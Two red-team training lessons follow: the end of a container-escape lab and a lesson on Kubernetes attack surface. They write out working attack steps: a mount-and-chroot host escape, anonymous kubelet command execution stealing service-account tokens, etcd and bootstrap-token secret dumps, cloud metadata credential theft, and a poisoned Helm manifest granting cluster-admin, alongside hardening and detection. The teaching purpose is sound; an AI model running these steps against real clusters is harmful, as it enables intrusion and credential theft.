cd ~/escape-lab
docker compose up -d
docker compose exec vulnerable sh
15.3 Enumerate

Inside the container:
cat /proc/1/cgroup
ls /.dockerenv
grep -E '^Cap(Prm|Eff)' /proc/self/status
capsh --print | head -20
mount | grep -E 'docker.sock|/dev/sda'
ls /dev/sda* /var/run/docker.sock

# Confirm we are privileged:
ip link add dummy0 type dummy && ip link del dummy0 && echo "PRIVILEGED"

Expected outcome: full capability set, docker socket mounted, host block device visible, host /proc writable.
15.4 Execute the release_agent Escape

Follow Section 6.2 verbatim. When you cat /output after the trigger, you should see the host's ps -ef — proof that the payload ran outside your container's PID namespace.
15.5 Drop into a Host Shell

Using the Escape 5 primitive because /var/lib/docker is on /dev/sda1:
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
whoami
hostname

You are now root on the host — from a stock Alpine image, in five commands.
15.6 Apply Mitigations

Rewrite the Compose file:
services:
  hardened:
    image: alpine:3.19
    container_name: hardened
    command: sleep infinity
    user: "10001:10001"
    read_only: true
    cap_drop: [ "ALL" ]
    security_opt:
      - no-new-privileges:true
      - seccomp=default
    pids_limit: 100
    tmpfs:
      - /tmp:rw,noexec,nosuid,size=64m
    # NO privileged, NO docker.sock mount, NO hostPath.
15.7 Re-Run the Escape

Recreate the container and repeat Sections 15.3 to 15.5:
docker compose down
docker compose up -d
docker compose exec hardened sh

Observations you should record:

    capsh --print shows an empty current set.
    ip link add dummy0 type dummy returns RTNETLINK answers: Operation not permitted.
    ls /dev/sda* shows no host block devices.
    mount -t cgroup -o rdma cgroup /tmp/cgrp fails with Operation not permitted.
    Writing to /proc/sys/kernel/core_pattern fails — the mount is read-only.
    No /var/run/docker.sock is present.

The escape is defused end-to-end. Capture screenshots of each blocked step for the report.
15.8 Detection Layer

While repeating the attack, keep a second terminal open running:
# Enable auditd rules covering the escape:
sudo tee -a /etc/audit/rules.d/container.rules <<'EOF'
-w /var/run/docker.sock -p rwa -k docker_socket
-w /proc/sys/kernel/core_pattern -p wa -k core_pattern
-a always,exit -F arch=b64 -S mount -k mount_syscall
EOF
sudo augenrules --load
sudo auditctl -l

# Watch events:
sudo ausearch -k core_pattern -ts recent
sudo ausearch -k docker_socket -ts recent

For Falco, install via the official repo, apply the default ruleset, and tail the log while performing the escape steps — every step in this lab should generate a matching alert with the default rules.
16. Exercises
16.1 Guided Exercises

Exercise 1 — Enumerate a Provided Container. Spin up docker run --rm -it --cap-add=SYS_PTRACE -v /etc:/host-etc:ro alpine sh. Using the checklist in Section 3, produce a written report that answers: what capabilities are present, what mounts are sensitive, and what is the shortest escape / data-exfil path. Aim for under 90 seconds.

Exercise 2 — Reproduce the Docker Socket Escape. Using the Compose file in Section 15.2, execute Escape 1 (mounted socket) instead of Escape 3. Deliverable: shell prompt showing the host hostname, plus the Falco alert generated by the escape.

Exercise 3 — Apply Then Verify Mitigations. Take the vulnerable Compose from Section 15.2, apply the hardened settings from 15.6, and re-run the enumeration checklist. Deliverable: a side-by-side table with "before" and "after" for every checklist item.
16.2 Independent Exercises

Exercise 4 — Audit a Provided Compose File for Escape Primitives.

Given the following file, identify every escape primitive it contains and propose a fix for each:
services:
  legacy-runner:
    image: python:3.11
    privileged: true
    network_mode: host
    pid: host
    volumes:
      - /:/host
      - /var/run/docker.sock:/var/run/docker.sock
      - /root/.ssh:/root/.ssh
    environment:
      - AWS_SECRET_ACCESS_KEY=hunter2
    command: python /app/server.py

Deliverable: one-page write-up listing each finding, its escape path, the Falco rule that would detect it, and the specific line in a hardened rewrite that fixes it.

Exercise 5 — Write a deepce-Style Checker in Bash.

Write a container-triage.sh script that:

    Detects whether it is running inside a container (using at least three of the signals in Section 3.1).
    Prints the capability set with human-readable names.
    Flags dangerous mounts (docker.sock, host /, /etc/shadow, /root/.ssh, /var/lib/docker).
    Attempts (safely) the four probes in Section 3.5 and reports pass/fail.
    Exits 0 if all checks pass, 1 if any dangerous condition is found.

Deliverable: the script, plus example output against both the vulnerable and hardened compose from the walkthrough.

Exercise 6 — Harden a Dockerfile That Runs as Root.

Given:
FROM ubuntu:22.04
RUN apt update && apt install -y python3 python3-pip
COPY . /app
WORKDIR /app
RUN pip3 install -r requirements.txt
CMD ["python3", "server.py"]

Produce a hardened version that:

    Uses a distroless or python:3.12-slim base.
    Creates and runs as a non-root user (UID > 10000).
    Sets WORKDIR to a directory owned by that user.
    Enables --read-only with an explicit tmpfs for anything that needs writes.
    Passes hadolint and trivy image with zero HIGH/CRITICAL findings.

Deliverable: the new Dockerfile, hadolint output, and trivy image output.
17. Summary and Next Steps

This lesson mapped the terrain a red-teamer walks after landing inside a container: enumerate first, choose the shortest of eight escape paths, and always frame the finding with the detection and the mitigation. The single most important lesson to take away is that container escapes in the wild are overwhelmingly misconfiguration escapes — a mounted socket, a --privileged sidecar, a hostPath: / volume — not kernel 0-day. Hunt for those in your engagements; teach your blue-team peers to write admission-controller rules and Falco alerts against them.

Key retention points:

    The container isolation model is namespaces + cgroups + capabilities + seccomp + LSM, all on one shared kernel. The kernel is the trust boundary you cannot cross without a sandbox like gVisor or a micro-VM like Kata.
    The first 60 seconds inside a container answer four questions: am I in a container, what are my capabilities, what is mounted, is the Docker socket present.
    CAP_SYS_ADMIN + cgroup v1 + writable release_agent = root on host. --privileged gives you all three by default.
    Kubernetes hostPID: true + privileged: true + nsenter = shell on the node.
    Every escape family has a Falco rule, an auditd file watch, and an EDR behavior — always include detection in your report.
    Hardening is boring and effective: non-root USER, --cap-drop=ALL, no-new-privileges, seccomp default, read-only rootfs, distroless base image, no host mounts.

Next lesson: Module 04 — Lesson 04: Kubernetes Cluster Attack Paths and RBAC Abuse — where we take the pod-escape primitive from Section 9 and chain it into full cluster compromise via service-account tokens, RBAC misconfigurations, and etcd exfiltration.




















Lesson 04 — Kubernetes Architecture and Attack Surface

    Module 04: Containers and Software Architecture · Penetration Testing with Kali Linux 1.0 · Red Team Leaders

Introduction

Kubernetes is now the modern Linux. Ten years ago, an internal penetration test meant Windows domains, file shares, and the occasional web app. Today, every mid-sized company runs at least one cluster, every startup ships to one, and every cloud provider offers a managed distribution. If you are performing an engagement in 2026 and you have not encountered a Kubernetes API server on port 6443, you have not looked hard enough.

This lesson treats Kubernetes not as a devops tool but as an operating system for distributed workloads — an operating system with its own kernel (the API server), its own filesystem (etcd), its own init process (the controller-manager), its own scheduler, its own IPC (services), and its own privilege model (RBAC and service accounts). Every one of these layers has a documented attack surface, and every one of them has been exploited in the wild.

By the end of this lesson you will be able to walk into an engagement, identify the cluster components from unauthenticated network probes, enumerate the RBAC surface from a compromised pod, and chain misconfigurations into cluster-admin. You will also be able to explain to a blue team exactly which admission controller would have blocked you.
1. Kubernetes is the Modern Linux

Every pentester who has been working since 2018 has watched the same transition:

    The perimeter dissolved into service meshes.
    The Windows domain gave way to a control plane on port 6443.
    Local privilege escalation on a box was replaced by container escape into a node.
    Domain Admin was replaced by cluster-admin.

The learning curve is real. The good news is that Kubernetes leaks — the API is discoverable, the objects are enumerable, and the defaults are permissive. A pentester with a working kubectl and a good mental model of the object graph can accomplish in one afternoon what used to take a week of AD enumeration.

    Pentester Insight: In every cloud engagement since 2022 the highest-impact finding has come from Kubernetes, not the cloud provider itself. IAM is usually locked down. RBAC is usually not. Look for the cluster first.

2. Cluster Components in One Diagram

A Kubernetes cluster has two planes: the control plane (the brain) and the data plane (the workers). Every attack path passes through one or both.
                    ┌────────────────────────────────────────────────────┐
                    │                   CONTROL PLANE                    │
                    │                                                    │
   kubectl ────────►│  ┌──────────────┐   ┌──────────┐   ┌────────────┐  │
   (port 6443)      │  │  API Server  │◄─►│   etcd   │   │ Scheduler  │  │
                    │  │  kube-apisrv │   │  :2379   │   │            │  │
                    │  └──────┬───────┘   └──────────┘   └────────────┘  │
                    │         │                                          │
                    │         │           ┌────────────────────────────┐ │
                    │         └──────────►│ Controller-Manager         │ │
                    │                     │ (deployments, endpoints,   │ │
                    │                     │  service accounts, ...)    │ │
                    │                     └────────────────────────────┘ │
                    └─────────────────────┬──────────────────────────────┘
                                          │  TLS on 6443
                    ┌─────────────────────┴──────────────────────────────┐
                    │                                                    │
              ┌─────▼──────┐  ┌────────────┐  ┌────────────┐             │
              │  Node 1    │  │  Node 2    │  │  Node N    │             │
              │  kubelet   │  │  kubelet   │  │  kubelet   │  :10250     │
              │  :10250    │  │  :10250    │  │  :10250    │             │
              │  kube-proxy│  │  kube-proxy│  │  kube-proxy│             │
              │  containerd│  │  containerd│  │  containerd│             │
              │  ┌───────┐ │  │  ┌───────┐ │  │  ┌───────┐ │             │
              │  │ pods  │ │  │  │ pods  │ │  │  │ pods  │ │             │
              │  └───────┘ │  │  └───────┘ │  │  └───────┘ │             │
              └────────────┘  └────────────┘  └────────────┘             │
                                                                         │
                    ┌────────────────────────────────────────────────────┘
                    │                    DATA PLANE
                    └────────────────────────────────────────────────────
2.1 Control plane components
Component	Port	Job	Why the pentester cares
kube-apiserver	6443/tcp	Front door for every read/write	Authn, authz and admission live here
etcd	2379/tcp	Key-value store of every object	Contains all Secrets in plaintext
kube-scheduler	10259/tcp (metrics)	Binds pods to nodes	Rarely reachable, low priority
kube-controller-manager	10257/tcp (metrics)	Runs reconciliation loops	Holds service-account signing key
2.2 Data plane components
Component	Port	Job	Why the pentester cares
kubelet	10250/tcp	Runs and monitors pods on the node	/exec, /pods, /run = code execution
kube-proxy	(iptables/IPVS)	Programs the node’s networking	Path to lateral movement
container runtime	(unix socket)	Actually runs the containers	Escape target if you land on the node
3. Setting Up a Lab Cluster on Kali 2026

Kali 2026 ships with docker.io and containerd in the default repos. Three cluster distributions matter for lab work: kind (Kubernetes-in-Docker, best for CI-shaped experiments), minikube (VM-backed, best for kernel-level testing), and k3s (Rancher, single-binary, best for realistic multi-node labs).
3.1 kind
# Install docker (required by kind):
sudo apt update
sudo apt install -y docker.io
sudo usermod -aG docker "$USER"
newgrp docker

# Install kind:
curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.24.0/kind-linux-amd64
chmod +x ./kind
sudo mv ./kind /usr/local/bin/kind

# Install kubectl 1.29 (matches the kind node image):
curl -LO "https://dl.k8s.io/release/v1.29.4/bin/linux/amd64/kubectl"
sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl

# Create a two-node cluster:
cat > kind.yaml <<'YAML'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
  - role: worker
YAML
kind create cluster --name pt-lab --config kind.yaml --image kindest/node:v1.29.4

# Verify:
kubectl get nodes
# NAME                   STATUS   ROLES           AGE   VERSION
# pt-lab-control-plane   Ready    control-plane   40s   v1.29.4
# pt-lab-worker          Ready    <none>          20s   v1.29.4
3.2 minikube
curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
sudo install minikube-linux-amd64 /usr/local/bin/minikube
minikube start --driver=docker --kubernetes-version=v1.29.4 --nodes=2

kubectl get nodes
# NAME           STATUS   ROLES           AGE   VERSION
# minikube       Ready    control-plane   50s   v1.29.4
# minikube-m02   Ready    <none>          30s   v1.29.4
3.3 k3s
# Single-command install (server + agent on the same host):
curl -sfL https://get.k3s.io | INSTALL_K3S_VERSION=v1.29.4+k3s1 sh -

# k3s writes its kubeconfig to a root-only file; copy it out:
sudo cp /etc/rancher/k3s/k3s.yaml ~/.kube/config
sudo chown "$USER":"$USER" ~/.kube/config
sed -i 's/127.0.0.1/<your-lab-ip>/' ~/.kube/config

kubectl get nodes
# NAME    STATUS   ROLES                  AGE   VERSION
# kali    Ready    control-plane,master   30s   v1.29.4+k3s1

    Pentester Insight: Use kind for RBAC and admission-controller work, k3s when you want a realistic misconfigured cluster (its defaults are more permissive), and minikube when the exploit needs a real Linux kernel with its own modules loaded.

4. The API Server — the Front Door

Every request that changes a cluster passes through kube-apiserver on https://<master>:6443. It is the only component that talks to etcd, so if you cannot get past it you cannot change the cluster. Conversely, if you can get past it as cluster-admin, everything else is a formality.

The API server runs three stages on every request, in order:
   Request ──► [ AUTHN ] ──► [ AUTHZ ] ──► [ ADMISSION ] ──► etcd
              who are you?  can you do it?  is it allowed?
4.1 Authentication

Kubernetes does not have users of its own. It accepts identity from any of these plugins:

    X.509 client certificates (kubectl default in kubeadm clusters)
    Bearer tokens (service-account JWTs, static tokens)
    OIDC (Dex, Okta, Azure AD, Google)
    Webhook token authn (custom services)
    Bootstrap tokens (kubelet joining a cluster)

Anonymous requests get the username system:anonymous and the group system:unauthenticated. This is enabled by default on the API server (--anonymous-auth=true) and, disastrously, is often left enabled on the kubelet as well.
4.2 Authorization

Once authenticated, the request is evaluated against one or more authz modules:

    RBAC — the modern default, covered in section 9
    Node — a special authorizer that limits kubelets to their own node’s objects
    Webhook — external policy decisions (rare)
    ABAC — legacy, avoid

4.3 Admission

If authz says yes, admission controllers run in-order. They can mutate the object (mutating admission) or reject it (validating admission). This is where PodSecurity, OPA/Gatekeeper, and Kyverno live.
# Probe an API server without credentials:
curl -sk https://<master>:6443/version
# {
#   "major": "1",
#   "minor": "29",
#   "gitVersion": "v1.29.4",
#   ...
# }

# Anonymous list of namespaces (will be 403 if RBAC is correct):
curl -sk https://<master>:6443/api/v1/namespaces
# {"kind":"Status","status":"Failure","message":"namespaces is forbidden:
#  User \"system:anonymous\" cannot list resource ...","code":403}

# If you see 200 here you have already won:
curl -sk https://<master>:6443/api/v1/namespaces/kube-system/secrets
5. etcd — the Crown Jewel

etcd stores every Kubernetes object as a serialized value under a well-known key. Secrets are stored the same way — and by default they are stored unencrypted at rest. Anyone who can read the etcd store can read every Secret in the cluster.

etcd listens on port 2379/tcp (client) and 2380/tcp (peer). In a kubeadm cluster it listens only on 127.0.0.1 and requires mTLS. In a self-managed cluster it often listens on 0.0.0.0 and the certs are lying in /etc/kubernetes/pki/etcd/ for anyone with node access.
5.1 Enumerating etcd
# On the control-plane node:
sudo ETCDCTL_API=3 etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get / --prefix --keys-only | head -20
# /registry/apiregistration.k8s.io/apiservices/v1.
# /registry/apiregistration.k8s.io/apiservices/v1.admissionregistration.k8s.io
# /registry/clusterrolebindings/cluster-admin
# /registry/configmaps/kube-system/coredns
# /registry/secrets/default/default-token-abcde
# ...
5.2 Pulling a Secret directly
sudo ETCDCTL_API=3 etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/kube-system/bootstrap-token-abcdef
# k8s
# v1
# Secret
# ...
# token-id
# abcdef
# token-secret
# 0123456789abcdef

That bootstrap token, if still valid, lets you join a rogue node — see section 6.
5.3 Encryption at rest

The fix is EncryptionConfiguration passed to the API server via --encryption-provider-config. In 2026 the recommended provider is kms v2 with an external KMS. Anything using identity as the first provider is not encrypted, even if aescbc follows.

    Pentester Insight: When you get a shell on a control-plane node, always dump /etc/kubernetes/manifests/kube-apiserver.yaml. If it references --encryption-provider-config, read that file. If the first provider is identity, tell the customer that every Secret in etcd is plaintext.

6. kubelet on Every Node

The kubelet is the agent that talks to the container runtime on each node. It listens on 10250/tcp for API requests from the control plane and, historically, from anyone who could reach it. It exposes the endpoints below:
Endpoint	Purpose
/pods	JSON of every pod on the node
/exec/{ns}/{pod}/{container}	Interactive shell in a container
/run/{ns}/{pod}/{container}	Fire-and-forget command
/attach/{ns}/{pod}/{container}	Attach to running pid 1
/portForward/{ns}/{pod}	Forward a TCP port
/metrics	Prometheus metrics
/logs/	Node filesystem (yes, really, if webhook off)
6.1 Probing an exposed kubelet
# Anonymous listing of pods (returns JSON if --anonymous-auth=true):
curl -sk https://<node>:10250/pods | jq '.items[].metadata.name'
# "kube-proxy-abcde"
# "coredns-76f75df574-xyzab"
# "victim-app-6b7d5b7b5b-qrstu"

# Anonymous command execution in a container:
curl -sk https://<node>:10250/run/default/victim-app-6b7d5b7b5b-qrstu/app \
  -d "cmd=id"
# uid=0(root) gid=0(root) groups=0(root)
6.2 TLS bootstrap tokens

New nodes join the cluster by presenting a bootstrap token to the API server. The token has the form abcdef.0123456789abcdef and lives as a Secret in kube-system. If you can read Secrets there, you can enroll a rogue node and receive kubelet credentials.
# List bootstrap tokens (needs Secret read in kube-system):
kubectl -n kube-system get secrets \
  --field-selector type=bootstrap.kubernetes.io/token \
  -o jsonpath='{range .items[*]}{.data.token-id}{"."}{.data.token-secret}{"\n"}{end}' \
  | while read b64; do echo "$b64" | base64 -d; done
# abcdef.0123456789abcdef
6.3 Fixing kubelet

The correct configuration disables anonymous auth and requires webhook authorization:
# /var/lib/kubelet/config.yaml
authentication:
  anonymous:
    enabled: false
  webhook:
    enabled: true
authorization:
  mode: Webhook
7. kube-proxy and Cluster Networking

kube-proxy programs the node’s network stack so that a request to a Service IP reaches one of the backing pods. Two implementations dominate:

    iptables mode — the default. kube-proxy writes KUBE-SERVICES chains. Simple, slow for many services.
    IPVS mode — kernel-level load balancer. Faster, needed at scale.

7.1 CIDRs

Every cluster has at least two CIDRs:

    Pod CIDR (e.g. 10.244.0.0/16) — one IP per pod, routable inside the cluster.
    Service CIDR (e.g. 10.96.0.0/12) — virtual IPs load-balanced by kube-proxy.

# Discover the CIDRs:
kubectl cluster-info dump | grep -E "service-cluster-ip-range|cluster-cidr"
# "--service-cluster-ip-range=10.96.0.0/12"
# "--cluster-cidr=10.244.0.0/16"

# From inside any pod:
cat /etc/resolv.conf
# nameserver 10.96.0.10       <-- kube-dns Service IP
# search default.svc.cluster.local svc.cluster.local cluster.local
7.2 What the pentester does with the CIDR

From a compromised pod, scanning the pod CIDR reveals every other pod on the cluster. Scanning the service CIDR reveals every Service. Because most clusters have no NetworkPolicy (see section 11), pods can talk to each other freely.
# Inside a pod on 10.244.0.0/16:
apk add --no-cache nmap
nmap -sT -p 6379,3306,5432,8080,9200 --open 10.244.0.0/16
8. Objects — the Attack Surface

Kubernetes exposes ~50 built-in object kinds plus every CRD the cluster has installed. The ones that matter every engagement:
Kind	What it is	Why you look
Namespace	Logical isolation	Recon starts here
Pod	A group of containers	Where code runs
Deployment	Controller for pods	Target for pipeline poisoning
Service	Load-balanced VIP	Reachability map
Ingress	External HTTP router	External attack surface
Secret	Base64 blob of credentials	Loot
ConfigMap	Non-sensitive config, often has secrets anyway	Loot
ServiceAccount	Pod identity	Pivot
Role / ClusterRole	Set of permissions	Understand power
RoleBinding / ClusterRoleBinding	Attaches permissions to identities	Escalation path
NetworkPolicy	L3/L4 firewall	Rare in practice
# The one-command recon sweep:
kubectl get all,secrets,cm,ing,networkpolicy,sa,role,rolebinding \
  -A -o wide 2>/dev/null | less
9. RBAC — Roles, ClusterRoles, and Bindings

RBAC is the least-privilege model in Kubernetes. Four object kinds:

    Role — verbs (get, list, watch, create, update, patch, delete, deletecollection) on resources inside a namespace.
    ClusterRole — same, but cluster-wide (nodes, PVs, cluster-scoped CRDs) or applied to any namespace via a RoleBinding.
    RoleBinding — attaches a Role or ClusterRole to a subject inside a namespace.
    ClusterRoleBinding — attaches a ClusterRole to a subject cluster-wide.

Subjects are User, Group, or ServiceAccount.
9.1 Where RBAC fails

The failure modes are always the same:

    Wildcards. resources: ["*"], verbs: ["*"] is a cluster-admin in disguise.
    escalate verb on roles/clusterroles — lets a low-priv account write itself a bigger role.
    bind verb on roles/clusterroles — lets the account attach an existing powerful role to itself.
    impersonate verb on users, groups, serviceaccounts — lets the account become anyone.
    create on pods combined with node-writable hostPaths — lets the account read files off any node.
    create on pods/exec — lets the account run commands in any pod in a namespace.
    get on secrets in a namespace that contains a service-account token for a more powerful role.

9.2 Enumerating your own permissions
# From inside a pod or with a kubeconfig:
kubectl auth can-i --list
# Resources                                       Non-Resource URLs   Resource Names   Verbs
# selfsubjectreviews.authentication.k8s.io        []                  []               [create]
# selfsubjectaccessreviews.authorization.k8s.io   []                  []               [create]
# ...                                             [/healthz]          []               [get]
# secrets                                         []                  []               [get list]
# pods                                            []                  []               [get list create]
# pods/exec                                       []                  []               [create]

Any line with pods/exec [create] in a namespace that runs privileged workloads is a straight line to cluster-admin.
9.3 Enumerating everyone else’s
# Install kubectl-who-can:
kubectl krew install who-can

kubectl who-can create pods -A
kubectl who-can '*' '*' -A          # subjects with any permission at all
kubectl who-can escalate clusterroles
10. Service Accounts — Every Pod Has One

Every pod is automatically bound to a ServiceAccount. Unless the deployment opts out with automountServiceAccountToken: false, the pod filesystem contains a signed JWT that authenticates it to the API server:
/var/run/secrets/kubernetes.io/serviceaccount/
├── ca.crt        <-- cluster CA cert to trust the API server
├── namespace     <-- text file with the pod's namespace
└── token         <-- JWT, valid ~1h, auto-rotated by kubelet
10.1 Using the token from a pod
# The three variables every K8s exploit needs:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# What am I?
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/apis/authentication.k8s.io/v1/tokenreviews \
  -X POST -H 'Content-Type: application/json' \
  -d "{\"kind\":\"TokenReview\",\"apiVersion\":\"authentication.k8s.io/v1\",
       \"spec\":{\"token\":\"$TOKEN\"}}"

# What can I do?
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -H 'Content-Type: application/json' \
  -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",
       \"spec\":{\"namespace\":\"$NS\"}}"
10.2 The default token is dangerous when bound wrongly

The most common critical finding in real engagements is a ClusterRoleBinding of cluster-admin to system:serviceaccount:default:default. Anyone who owns any pod in the default namespace is cluster-admin. See section 11.
11. Common Misconfigurations — The Pentester's Top 10
11.1 Anonymous auth on API server or kubelet

Ship-with defaults for the API server allow anonymous. RBAC should stop system:anonymous, but often does not. Kubelet --anonymous-auth=true is worse — direct code execution.
curl -sk https://<master>:6443/api/v1/nodes | head -5
curl -sk https://<node>:10250/pods | head -5
11.2 Overly broad ClusterRoleBinding
# Look for cluster-admin bound to anything worrying:
kubectl get clusterrolebindings -o json | \
  jq -r '.items[] | select(.roleRef.name=="cluster-admin") |
         "\(.metadata.name)  ->  \(.subjects // [] | map(.kind+":"+(.namespace//"-")+"/"+.name) | join(", "))"'
# cluster-admin      ->  Group:-/system:masters
# ci-admin           ->  ServiceAccount:default/default   <-- CRITICAL
# oops               ->  Group:-/system:anonymous          <-- CRITICAL
11.3 Exposed dashboard without auth

The Kubernetes Dashboard is often deployed with --enable-skip-login or with a ClusterRoleBinding of cluster-admin to its ServiceAccount. If you can reach https://<host>:<port>/#/overview and click Skip, you own the cluster.
11.4 Privileged pods, hostPID, hostNetwork
# The nightmare pod:
spec:
  hostPID: true
  hostNetwork: true
  hostIPC: true
  containers:
    - name: shell
      image: alpine
      securityContext:
        privileged: true
      volumeMounts:
        - name: host
          mountPath: /host
  volumes:
    - name: host
      hostPath:
        path: /

Any pod matching that spec = root on the node = every other pod's tokens.
11.5 Mounted host paths in workloads

Look for /, /var/run/docker.sock, /var/run/containerd/containerd.sock, /etc/kubernetes, /var/lib/kubelet mounted into a container. Any one of them is a straight path off the pod.
kubectl get pods -A -o json | jq -r '
  .items[] | . as $p |
  (.spec.volumes // [])[] |
  select(.hostPath) |
  "\($p.metadata.namespace)/\($p.metadata.name)  hostPath=\(.hostPath.path)"'
11.6 Unencrypted etcd

Covered in section 5. Confirm with grep encryption-provider-config /etc/kubernetes/manifests/kube-apiserver.yaml on a control-plane node.
11.7 Weak or absent NetworkPolicy

Kubernetes ships with no default NetworkPolicy. Every pod can reach every other pod on every port. Ask the customer for the count of NetworkPolicy objects:
kubectl get networkpolicy -A --no-headers | wc -l
# 0
11.8 Secrets stored as plain env vars

env.valueFrom.secretKeyRef is fine; env.value: "supersecret" is not. Any pod description leaks it.
kubectl get pods -A -o json | jq -r '
  .items[] | . as $p | (.spec.containers[]?) |
  (.env // [])[] |
  select(.value != null and (.name | test("(?i)pass|token|key|secret"))) |
  "\($p.metadata.namespace)/\($p.metadata.name)  \(.name)=\(.value)"'
11.9 Vulnerable images

Old base images with unpatched glibc, log4j, or openssl. Trivy or Grype in the pipeline; on the pentest side, kubectl get pods -A -o json | jq '.items[].spec.containers[].image' and cross-reference.
11.10 Cloud IMDS reachable from pods

On EKS, GKE, and AKS the cloud provider’s Instance Metadata Service (169.254.169.254) is reachable from every pod by default unless explicitly blocked. A pod that can talk to IMDS can steal the node’s IAM role.
# From inside a pod on EKS:
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
12. Enumeration Tools
12.1 kubectl auth can-i
kubectl auth can-i --list -n kube-system
kubectl auth can-i create pods -n dev
# yes
kubectl auth can-i '*' '*' -A
# no
12.2 kube-hunter
pipx install kube-hunter
kube-hunter --remote <master-ip>
# Kubernetes Hunter found the following vulnerabilities:
# ID    LOCATION                             CATEGORY               VULNERABILITY
# KHV002  <master>:6443     Information Disclosure   K8s Version Disclosure
# KHV005  <node>:10250      Remote Code Execution    Anonymous Authentication
# KHV050  <master>:6443     Access Risk              Read access to K8s secrets
12.3 kube-bench

CIS Kubernetes Benchmark. Run it on every node in the cluster:
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
kubectl logs -f job/kube-bench
# [FAIL] 1.2.16 Ensure that the --profiling argument is set to false
# [FAIL] 1.2.19 Ensure that the --audit-log-path argument is set
# [WARN] 4.2.6 Ensure that the --protect-kernel-defaults argument is set to true
12.4 peirates

Interactive post-exploit menu — runs inside a compromised pod and offers dump-secrets, ADFS-token-steal, kubelet-abuse, and IMDS-abuse. Perfect for demos.
12.5 botb (Break out the Box)

Container-escape suite. Detects hostPath mounts, privileged flags, docker sockets, CVE-2022-0492, and CVE-2024-XXXX classes.
13. Attack Path 1 — Compromised Pod to Cluster-Admin
compromised pod  ──► kubelet on node  ──► every pod on node  ──► API server ──► cluster-admin
13.1 Step-by-step
# 1. Inside the compromised pod. Am I on a node with juicy pods?
curl -sk https://$(cat /etc/hostname | awk '{print $1}'):10250/pods 2>/dev/null | jq .
# ... or better, the node's own IP from downward API

# 2. Enumerate other pods on this node — they all mount their own service-account tokens.
NODE_IP=$(awk '/nameserver/{print $2; exit}' /etc/resolv.conf | \
          xargs -I{} curl -sk https://{}:10250/pods | jq -r '.items[0].status.hostIP')
curl -sk https://$NODE_IP:10250/pods \
  | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name)"'

# 3. Anonymous /exec against a pod running as a powerful ServiceAccount:
curl -sk "https://$NODE_IP:10250/exec/kube-system/kube-controller-manager-XX/kube-controller-manager?command=cat&command=/var/run/secrets/kubernetes.io/serviceaccount/token"

# 4. Present that token to the API server and confirm cluster-admin:
TOKEN=<stolen>
kubectl --token=$TOKEN --server=https://<master>:6443 --insecure-skip-tls-verify \
  auth can-i '*' '*' -A
# yes
14. Attack Path 2 — Leaked Kubeconfig to Cloud Takeover
leaked kubeconfig ──► API server ──► etcd secret ──► cloud IAM ──► cloud account admin
14.1 Step-by-step
# 1. Kubeconfig found in a public S3 bucket / GitHub Actions log / .git/config
export KUBECONFIG=./leaked.kubeconfig
kubectl auth can-i get secrets -A
# yes  (this is the common developer-token failure)

# 2. Dump every Secret and grep for cloud IAM tokens:
kubectl get secrets -A -o json | \
  jq -r '.items[] | .metadata.namespace + "/" + .metadata.name + " " +
                    (.data // {} | to_entries[] | .key)' | \
  grep -iE 'aws|azure|gcp|cloud|iam|role|access|creds'

# 3. Base64-decode the interesting one:
kubectl -n prod get secret cloud-admin -o json | \
  jq -r '.data | to_entries[] | "\(.key)=\(.value | @base64d)"'

# 4. Use the cloud CLI:
aws sts get-caller-identity
# {
#   "Arn": "arn:aws:iam::123456789012:user/ci-admin"
# }
15. Attack Path 3 — CI/CD Poisoning
low-priv git commit ──► CI/CD SA has cluster-admin ──► poisoned manifest ──► cluster-admin
15.1 Common setup

The CI/CD system deploys with a ServiceAccount that has cluster-admin — because the platform team did not want to fight over RBAC. That ServiceAccount’s token lives in a Secret. Anyone who can trigger a build can kubectl apply anything.
15.2 Attack

Push a commit that changes a Helm values file to add:
# helm/values.yaml — hostile change
extraManifests:
  - |
    apiVersion: rbac.authorization.k8s.io/v1
    kind: ClusterRoleBinding
    metadata:
      name: pipeline-forever
    subjects:
      - kind: User
        name: attacker
    roleRef:
      kind: ClusterRole
      name: cluster-admin
      apiGroup: rbac.authorization.k8s.io

Pipeline runs, applies the manifest, and the attacker is now permanently cluster-admin — with no code execution on any workload.
15.3 Fix

    Pin the CI ServiceAccount to edit in specific namespaces, not cluster-admin cluster-wide.
    Require signed commits and Kyverno/OPA policies that block ClusterRoleBinding creation from CI.
    Enforce image policy: only images from the org’s registry are admitted.

16. Detection
16.1 Audit logs

The API server logs every authz decision if configured:
# /etc/kubernetes/audit-policy.yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  - level: Metadata
    resources:
      - group: ""
        resources: ["secrets", "configmaps"]
  - level: RequestResponse
    verbs: ["create", "update", "patch", "delete"]

Point the API server at it:
--audit-policy-file=/etc/kubernetes/audit-policy.yaml
--audit-log-path=/var/log/kubernetes/audit.log
--audit-log-maxage=30
16.2 Falco

Runtime detection based on syscall rules. Ships with policies for:

    Shell in a container
    Write below /etc
    Read of a service-account token from an unexpected pod
    Contact with IMDS

helm install falco falcosecurity/falco -n falco --create-namespace
